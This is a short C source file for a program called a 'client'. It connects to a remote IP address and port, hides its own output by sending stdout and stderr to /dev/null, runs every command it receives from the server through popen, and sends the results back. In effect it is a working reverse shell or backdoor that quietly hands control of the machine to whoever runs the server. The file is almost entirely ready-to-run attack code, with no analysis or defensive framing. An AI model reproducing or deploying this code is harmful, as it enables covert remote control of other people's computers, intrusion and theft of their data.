#include <unistd.h>
#include <stdio.h>
#include <string.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <netdb.h>
#include <arpa/inet.h>
#include <netinet/in.h>
#include<fcntl.h>

#define MAX 100

int main(int argc, char *argv[])
{
    struct addrinfo hints, *res;
    int status;
    char inbuff[MAX];

    //check for correct command line arguments
    if (argc < 3)
    { 
        printf("usage: ./client <ip-address> <port>\nExample: ./client 127.0.0.1 3000\n");
        return (1);
    }
    // Initialize hints structure
    memset(&hints, 0, sizeof hints);
    hints.ai_family = AF_INET; //IPv4
    hints.ai_socktype = SOCK_STREAM; //TCP

    if ((status = getaddrinfo(argv[1], argv[2], &hints, &res)) != 0)
    {
        fprintf(stderr, "getaddrinfo: %s\n", gai_strerror(status));
        return 2;
    }

    int sockfd = socket(res->ai_family, res->ai_socktype, res->ai_protocol);
    connect(sockfd, res->ai_addr, res->ai_addrlen);
    
    //Redirect stdout and stderr to /dev/NULL so nothing will be printed on client's side
    dup2(open("/dev/null", O_WRONLY), STDOUT_FILENO);
    dup2(open("/dev/null", O_WRONLY), STDERR_FILENO);

    while (1)
    {
        memset(inbuff, 0, MAX);

        // receive command from server
        recv(sockfd, inbuff, MAX, 0);

        // if command END is sent, close socket
        if (strcmp(inbuff, "END") == 0)
        {
            close(sockfd);
            break;
        }
        // execute command and send output to server
        FILE *fp;
        if ((fp = popen(inbuff, "r")) != NULL)
        {
            size_t bytesRead;
            while ((bytesRead = fread(inbuff, 1, sizeof(inbuff), fp)) > 0)
            {
                send(sockfd, inbuff, bytesRead, 0);
            }
            send(sockfd, "***", 3, 0); // *** shows end of message
            pclose(fp);
        }
        else
        {
            perror("Error :");
        }
    }
    close(sockfd);
    return 0;
}
